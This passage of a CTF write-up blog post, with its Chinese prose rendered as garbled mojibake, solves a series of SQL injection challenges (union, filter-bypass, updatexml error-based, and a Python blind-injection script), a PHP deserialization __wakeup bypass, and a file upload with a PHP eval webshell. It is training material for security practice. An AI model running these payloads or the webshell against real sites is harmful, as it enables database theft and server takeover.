<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,(select(group_concat(password))from geekuser)%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/13.png" class="">

<p>emmmé‚£flagä¸æ˜¯åœ¨è¿™å¼ è¡¨é‡Œï¼Œæ¢æˆl0ve1ysq1åé‡å¤ä¹‹å‰çš„æ“ä½œæœç„¶èƒ½å¤Ÿçœ‹åˆ°flagäº†ã€‚</p>
<img src="/ctf/jikectf/14.png" class="">



<h1 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h1><img src="/ctf/jikectf/15.png" class="">

<p>åšäº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Ÿé‚£å°±æ˜¯è¿‡æ»¤äº†äº›å•è¯8</p>
<p>è¯•è¯•ä¸‡èƒ½å¯†ç ï¼Œæœç„¶ä¸æˆåŠŸã€‚åˆè¯•äº†ä¸‹order byï¼Œå‘ç°</p>
<img src="/ctf/jikectf/16.png" class="">

<p>å—¯ï¼Ÿè¿™æ˜¯æŠŠoræ›¿æ¢æˆç©ºäº†å—</p>
<p>çŒœæµ‹åº”è¯¥æ˜¯è¿™æ ·ï¼Œé‚£å°±ç”¨åŒå†™è¯•è¯•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39; oorr 1&#x3D;1%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/17.png" class="">

<p>æœç„¶ç™»ä¸Šå»äº†ï¼Œå¹¶ä¸”è·Ÿä¸Šä¸€å…³çš„å›æ˜¾å¾ˆåƒã€‚åˆæµ‹è¯•äº†ä¸€ä¸‹ï¼Œè¿™å…³æ˜¯æŠŠ<code>or</code>ã€<code>and</code>ã€<code>select</code>ã€<code>by</code>ã€<code>union</code>ç­‰æ›¿æ¢ä¸ºç©ºäº†ï¼Œä½†æ˜¯åªæ›¿æ¢äº†ä¸€æ¬¡æ‰€ä»¥å¯ä»¥ç”¨åŒå†™ã€‚</p>
<p>ç„¶åé™¤äº†åŒå†™ï¼Œå…¶ä»–çš„æ­¥éª¤éƒ½è·Ÿä¸Šä¸€æ­¥ä¸€æ ·ï¼Œå°±ä¸åœ¨è¿™é‡Œé‡å¤å†™payloadäº†ã€‚</p>
<h1 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h1><img src="/ctf/jikectf/18.png" class="">

<p>åˆç”¨äº†ä¸€ä¸‹å‰é¢çš„ä¸‡èƒ½å¯†ç ï¼Œå‘ç°æ˜¯è¿™æ ·çš„ç•Œé¢ã€‚</p>
<img src="/ctf/jikectf/19.png" class="">

<p>ç„¶ååˆè¯•äº†ä¸€ä¸‹and,order byä¹‹ç±»çš„ï¼Œä¸€ç›´å‡ºç°è¿™ä¸ªç•Œé¢ã€‚æˆ‘å¼€å§‹ç–‘æƒ‘äº†ï¼Œéš¾é“ä»–çš„æ„æ€æ˜¯æˆ‘æ•´å¯¹äº†ï¼Œæ‰€ä»¥è¯´åˆ«è®©ä»–é€®åˆ°æˆ‘å—qaqé‚£æ€ä¹ˆè¯•äº†å¥½å‡ ç§æ–¹æ³•éƒ½æ‹¿ä¸åˆ°è¡¨åä¹‹ç±»çš„ï¼Ÿï¼Ÿ</p>
<p>äºæ˜¯æˆ‘fuzzäº†ä¸€ä¸‹ã€‚</p>
<p>åŸæ¥è¿™ä¸ªç•Œé¢æ˜¯è¾“å…¥äº†è¿‡æ»¤å­—ç¬¦çš„æ„æ€= =å…¶ä¸­è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦</p>
<img src="/ctf/jikectf/20.png" class="">

<p>è¿™æ˜¯å…¶ä¸­çš„ä¸€äº›ï¼Œè¿˜æœ‰ç©ºæ ¼ä»€ä¹ˆçš„ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚</p>
<p>ä½†æ²¡æœ‰è¿‡æ»¤orï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•ç”¨updatexmlæŠ¥é”™æ³¨å…¥ã€‚</p>
<p>è¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨æ‹¬å·ä»£æ›¿ï¼Œè¿‡æ»¤äº†ç­‰å·å¯ä»¥ç”¨likeä»£æ›¿ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/21.png" class="">

<p>ï¼æœç„¶å­˜åœ¨æŠ¥é”™æ³¨å…¥ï¼</p>
<p>ç„¶åå°±å¸¸è§„æ“ä½œä¸‹ä¸€æ­¥å¥½äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/22.png" class="">

<p>çˆ†åˆ—å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/23.png" class="">

<p>å†çˆ†å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/24.png" class="">

<p>è·Ÿä¸Šé¢çš„æ‹¼æ¥åœ¨ä¸€èµ·å°±å¥½äº†ã€‚</p>
<p>è¿˜æœ‰è¿˜æœ‰ç”¨é€†åºè¾“å‡ºä¹Ÿå¯ä»¥ï¼ç„¶åå†å†™è„šæœ¬æŠŠå®ƒæ­£è¿‡æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39;or(updatexml(1,concat(0x3a,reverse((select(group_concat(password))from(H4rDsq1)))),1))%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/26.png" class="">

<img src="/ctf/jikectf/27.png" class="">

<p>å†æ‹¼æ¥ä¸Šå°±å¯ä»¥äº†</p>
<p>è¿™æ˜¯æˆ‘çœ‹åˆ°çš„ä¸€ç¯‡å†™æŠ¥é”™æ³¨å…¥å†™å¾—å¾ˆå¥½çš„<a href="http://drops.xmd5.com/static/drops/tips-14312.html" target="_blank" rel="noopener">æ–‡ç« </a></p>
<p>å¹¶ä¸”è¿™é“é¢˜è¿˜å¯ä»¥ç”¨<code>^</code>å¼‚æˆ–æ¥åšï¼Œè·ŸoråŸç†å·®ä¸å¤šï¼Œå°±æ”¹ä¸€ä¸‹å°±å¥½äº†ã€‚</p>
<h1 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h1><p>è¿™æ˜¯æœ€åé“sqläº†ï¼Œä¸å¾—ä¸å¤¸èµæˆä¿¡å‡ºçš„è¿™å‡ é“sqlæ³¨å…¥é¢˜ç¡®å®nbï¼Œç”±æµ…å…¥æ·±æ¶‰åŠäº†å¾ˆå¤šç‚¹ï¼ŒğŸ‘ğŸ»ã€‚</p>
<img src="/ctf/jikectf/29.png" class="">

<p>æœ¬æ¥çŒœæµ‹è¿™é“é¢˜åº”è¯¥å°±æ˜¯ç›²æ³¨äº†ï¼Œæœç„¶æ˜¯è¿™æ ·äº†ã€‚</p>
<p>æˆ‘è¯•ç€ç‚¹äº†ä¸€ä¸‹ä»–ç»™çš„é‚£å‡ ä¸ªæŒ‰é’®ã€‚</p>
<p>ï¼Ÿï¼Ÿå¹¶ä¸”æˆ‘è¿˜å…¨éƒ¨éƒ½ç‚¹äº†</p>
<p>å‰å››ä¸ªéƒ½æ²¡ä»€ä¹ˆç”¨ï¼Œåº·åº·ç¬¬äº”ä¸ª</p>
<img src="/ctf/jikectf/30.png" class="">

<p>æ‰€ä»¥ä»–æ˜¯åœ¨å†ä¸€æ¬¡æé†’æˆ‘è¿™æ˜¯ç›²æ³¨å—= =</p>
<p>äºæ˜¯æˆ‘å¼€å§‹æ‰¾æ³¨å…¥ç‚¹äº†ã€‚</p>
<p>åƒå‰å‡ å…³é‚£æ ·å…ˆè¯•è¯•ç”¨ä¸‡èƒ½å¯†ç ã€‚</p>
<img src="/ctf/jikectf/32.png" class="">

<p>å—¯ï¼Ÿç„¶ååˆè¯•ç€è¾“äº†äº›payloadï¼Œå…¨éƒ¨éƒ½æ˜¾ç¤ºè¿™ä¸ªã€‚æˆ‘å¼€å§‹è¿·æƒ‘äº†ã€‚</p>
<p>ä¸æ‰¾åˆ°å›æ˜¾æ ‡å¿—æˆ‘æ€ä¹ˆç”¨ç›²æ³¨å˜›qaq</p>
<p>ç„¶åæˆ‘åˆå›åˆ°æœ€åˆçš„é¡µé¢ï¼Œç‚¹è¿›åºå·ä¸º1çš„é¡µé¢çœ‹çœ‹ã€‚</p>
<img src="/ctf/jikectf/31.png" class="">

<p>å™¢è¯´ä¸å®šè¿™æ‰æ˜¯è¿™å…³çš„æ³¨å…¥é¡µé¢ã€‚äºæ˜¯æˆ‘åˆfuzzäº†ä¸€ä¸‹ã€‚</p>
<p>é€šè¿‡fuzzï¼Œæˆ‘å‘ç°é¡µé¢æœ‰4ç§æƒ…å†µã€‚</p>
<ul>
<li>è‡­å¼Ÿå¼Ÿ</li>
<li>NO! Not this! Click others</li>
<li>Errorï¼</li>
<li>Errorï¼ï¼ï¼</li>
</ul>
<p>æŒ‰ç…§å‰ä¸¤å…³çš„ä¼ ç»Ÿï¼Œè‡­å¼Ÿå¼Ÿçš„é¡µé¢åº”è¯¥å°±æ˜¯è¢«è¿‡æ»¤çš„ã€‚</p>
<img src="/ctf/jikectf/33.png" class="">

<p>ï¼ˆæ²¡æœ‰æˆªå®Œå“ˆ æœ‰ç‚¹å¤š</p>
<p>é‚£å°±å¾ˆæ˜æ˜¾å¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨äº† è·Ÿæœ‰é“å«<code>é¢œå€¼æŸ¥è¯¢</code>çš„é¢˜ä¸€æ ·</p>
<p>ç»è¿‡å°è¯•åï¼Œ<code>1^1^1</code>ä¸ºçœŸï¼Œå›æ˜¾ä¸º<code>NO! Not this! Click others~~~</code></p>
<p><code>1^0^1</code>ä¸ºå‡ï¼Œå›æ˜¾ä¸º<code>ERRORï¼ï¼ï¼</code></p>
<p>é‚£æˆ‘åˆè¦æ‹¿å‡ºæˆ‘çš„è„šæœ¬äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://baf0ae84-8f87-4287-9a5e-0959c6049648.node3.buuoj.cn/search.php?id='</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span></span><br><span class="line">payload2 = <span class="string">"1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where("</span> \</span><br><span class="line">           <span class="string">"table_schema='geek')),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span></span><br><span class="line">payload3 = <span class="string">"1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where("</span> \</span><br><span class="line">           <span class="string">"table_name='F1naI1y')),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span></span><br><span class="line">payload4 = <span class="string">"1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload = payload4.format(i, mid)</span><br><span class="line"></span><br><span class="line">        new_url = url + payload</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Click"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>



<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><img src="/ctf/jikectf/34.png" class="">

<p>è¿™åªçŒ«å’ªå¥½ï¼å¯ï¼çˆ±ï¼é¸­ï¼</p>
<p>è¿™ä¸ªå‰ç«¯åšå¾—å¥½æ£’ï¼æˆ‘ç©äº†å¥½ä¹…hhhhhæˆ‘å®¶åä¸€ä¹Ÿçˆ±åœ¨æˆ‘å†™ä»£ç æ‰“å­—çš„æ—¶å€™è·³åˆ°æˆ‘é”®ç›˜ä¸Šæ¥å“ˆå“ˆå“ˆå“ˆ</p>
<p>å¥½8æ¥ç€çœ‹é¢˜äº†</p>
<p>å¤‡ä»½ç½‘ç«™â€¦emmmæˆ‘æ‰«äº†ä¸€ä¸‹ï¼Œæœç„¶æ‰«åˆ°å¤‡ä»½æ–‡ä»¶äº†ã€‚</p>
<img src="/ctf/jikectf/35.png" class="">

<p>å…ˆçœ‹çœ‹index.phpï¼Œå…¶ä¸­ä¸»è¦çš„ä¸€æ®µä»£ç æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">    $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¦ä¼ å…¥selectï¼Œå¹¶ä¸”å¯¹å®ƒçš„å€¼ååºåˆ—åŒ–ã€‚æˆ‘ä»¬åº·åº·class.phpé‡Œçš„å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¤§è‡´æ„æ€å°±æ˜¯é€šè¿‡<code>__destruct()</code>æ‰§è¡Œååºåˆ—åŒ–ï¼Œå¦‚æœæ»¡è¶³ä¸¤ä¸ªæ¡ä»¶å°±echo flagã€‚</p>
<p>ä¸¤ä¸ªæ¡ä»¶åˆ†åˆ«æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;password &#x3D;&#x3D; 100</span><br><span class="line">$this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>

<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h3><p>é‚£ä¹ˆå°±è¦æ„é€ æ»¡è¶³æ¡ä»¶çš„åºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œåå¾—åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±åœ¨<code>__destruct</code>æ—¶å°±ä¼šåˆ¤æ–­æ­£ç¡®äº†ã€‚</p>
<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>ä½†æ˜¯å‰é¢æœ‰ä¸€å¤„<code>__wakeup</code>é­”æœ¯æ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰å°±ä¼šå°†guestèµ‹å€¼ç»™usernameï¼Œè¿™æ ·æˆ‘ä»¬æ„é€ çš„å°±æ²¡ç”¨äº†ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡<code>__wakeup</code>äº†ã€‚</p>
<p>åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œå±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡ __wakeup()å‡½æ•°çš„æ‰§è¡Œ</p>
<p>å› æ­¤æˆ‘ä»¬å°†åºåˆ—åŒ–è¿™æ ·è®¾ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:4:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>å°±èƒ½æˆåŠŸç»•è¿‡<code>__wakeup</code>é­”æœ¯æ–¹æ³•äº†ã€‚</p>
<h3 id="private-å£°æ˜"><a href="#private-å£°æ˜" class="headerlink" title="private å£°æ˜"></a>private å£°æ˜</h3><p>private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š0çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦</p>
<p>æˆ‘ä»¬å†æ¬¡æ”¹é€ ä¸€ä¸‹åºåˆ—åŒ–:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/36.png" class="">

<p>æˆ‘åˆå¯ä»¥äº†</p>
<h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ç»•è¿‡phpæ£€æµ‹ï¼Œæ”¹content-typeä¸ºï¼šimage/jpeg</p>
<p>ç„¶åä¸Šä¼ å›¾ç‰‡é©¬å°±å¯ä»¥äº†</p>
<p>ä¸€èˆ¬å¯ä»¥ç”¨<strong>php3 php4 phtml</strong>ç»•è¿‡phpæ£€æµ‹</p>
<p>è¿™é‡Œç”¨phtml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç»è¿‡bpæ”¹åå‘é€ï¼Œå†è¿shellå°±è¡Œäº†ã€‚</p>
<h1 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h1></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Neorah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://neorah.me/ctf/jikectf/">https://neorah.me/ctf/jikectf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" rel="noopener">CC BY-NC-SA 3.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sqlæ³¨å…¥</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">æ–‡ä»¶åŒ…å«</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">æ–‡ä»¶ä¸Šä¼ </a><a class="post-meta__tags" href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96/">åºåˆ—åŒ–</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/ctf/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"><i class="fa fa-chevron-left">  </i><span>[å¼ºç½‘æ¯2019]WEB WP</span></a></div><div class="next-post pull-right"><a href="/%E6%B0%B4%E6%96%87/pentestabout/"><span>å…³äºæ¸—é€æµ‹è¯•çš„ä¸€ç‚¹æƒ³æ³•</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/top.JPG)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Neorah</div><div class="footer_custom_text">Theme By melody</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/algolia.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>